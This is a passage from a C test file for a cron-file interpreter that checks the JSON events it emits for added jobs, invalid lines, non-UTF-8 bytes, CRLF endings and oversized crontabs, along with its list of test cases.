        "{\"event\":\"invalid_finding\",\"interp\":\"cron\",\"text\":\"invalid finding\",\"paths\":[\"etc/cron.d/x\"]}\n"
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/x\",\"schedule\":\"@reboot\",\"user\":\"root\","
        "\"command\":\"after\",\"env\":[],\"in_words\":\"at startup (by cron's clock)\","
        "\"text\":\"cron job added in etc/cron.d/x: @reboot root after\",\"paths\":[\"etc/cron.d/x\"]}\n",
        one(&r, "etc/cron.d/x", big, w));                        /* and no final newline */
    tr_free(&r);
    /* CRLF: the CR is a byte of the command, as written. */
    ASSERT_EQ_STR(
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/crontab\",\"schedule\":\"1 2 * * *\",\"user\":\"root\","
        "\"command\":\"a\\r\",\"env\":[],\"in_words\":\"at 02:01 every day (by cron's clock)\","
        "\"text\":\"cron job added in etc/crontab: 1 2 * * * root a\\r\",\"paths\":[\"etc/crontab\"]}\n",
        one(&r, "etc/crontab", "1 2 * * * root a\r\n", 18));
    tr_free(&r);
    /* Not UTF-8: no string of an event may carry it (E9). */
    ASSERT_EQ_STR("{\"event\":\"invalid_finding\",\"interp\":\"cron\",\"text\":\"invalid finding\",\"paths\":[\"etc/cron.d/x\"]}\n",
                  one(&r, "etc/cron.d/x", "1 2 * * * root \xff\xfe\n", 18));
    tr_free(&r);
    /* Lines of blanks, a comment after blanks, a line of one field. */
    ASSERT_EQ_STR("", one(&r, "etc/cron.d/x", " \t \n  # c\n\n", 11));
    tr_free(&r);
    ASSERT_EQ_STR(E10("etc/cron.d/x"), one(&r, "etc/cron.d/x", "word\n", 5));
    tr_free(&r);
    ASSERT_EQ_STR(E10("etc/cron.d/x"), one(&r, "etc/cron.d/x", "@reboot root\n", 13));
    tr_free(&r);
    ASSERT_EQ_STR(E10("etc/cron.d/x"), one(&r, "etc/cron.d/x", "=novalue\n", 9));
    tr_free(&r);
    /* A spool file's name is every job's user: many short jobs under a long name. */
    {
        static char name[300], jobs[60000];
        size_t jw = 0;
        snprintf(name, sizeof name, "var/spool/cron/crontabs/%0200d", 7);
        for (int i = 0; i < 5000; i++) jw += (size_t)snprintf(jobs + jw, sizeof jobs - jw, "@reboot x\n");
        const char *sp = one(&r, name, jobs, jw);
        ASSERT_EQ_INT(5000, count(sp, "{\"event\":\"cron_job_added\""));
        tr_free(&r);
    }
    /* 100,000 jobs: 65,535 events and one and_more counting the rest (E5). */
    static char many[3200000];
    w = 0;
    for (int i = 0; i < 100000; i++) w += (size_t)snprintf(many + w, sizeof many - w, "* * * * * root job%d\n", i);
    const char *ev = one(&r, "etc/cron.d/x", many, w);
    ASSERT_EQ_INT(65535, count(ev, "{\"event\":\"cron_job_added\""));
    ASSERT_TRUE(strstr(ev, "\"command\":\"job65534\"") != NULL && strstr(ev, "\"command\":\"job65535\"") == NULL);
    ASSERT_TRUE(strstr(ev, "{\"event\":\"and_more\",\"interp\":\"cron\",\"n\":34465,\"text\":\"and 34465 more\",\"paths\":[]}\n") != NULL);
    tr_free(&r);
}

int main(void) {
    t_begin("cron");
    RUN(crontab_jobs_added_and_removed_are_events_with_the_env_above_them);
    RUN(cron_d_and_spool_jobs_carry_user_owner_and_words);
    RUN(env_lines_are_changed_added_or_removed_and_do_not_move_jobs);
    RUN(files_cron_does_not_run_are_said_where_cron_is_installed);
    RUN(nothing_is_said_of_validity_where_cron_is_not_installed);
    RUN(scripts_of_the_four_directories_are_named_never_read);
    RUN(a_crontab_that_does_not_parse_is_could_not_interpret_and_its_record_stands);
    RUN(what_cannot_be_read_is_said_and_what_is_not_crons_is_declined);
    RUN(in_words_is_given_for_the_forms_of_the_table_only);
    RUN(in_words_is_absent_in_a_file_that_sets_a_time_zone);
    RUN(hostile_crontabs_are_read_or_refused_never_trusted);
    free(g_text);
    t_end();
    return belay_test_report();
}
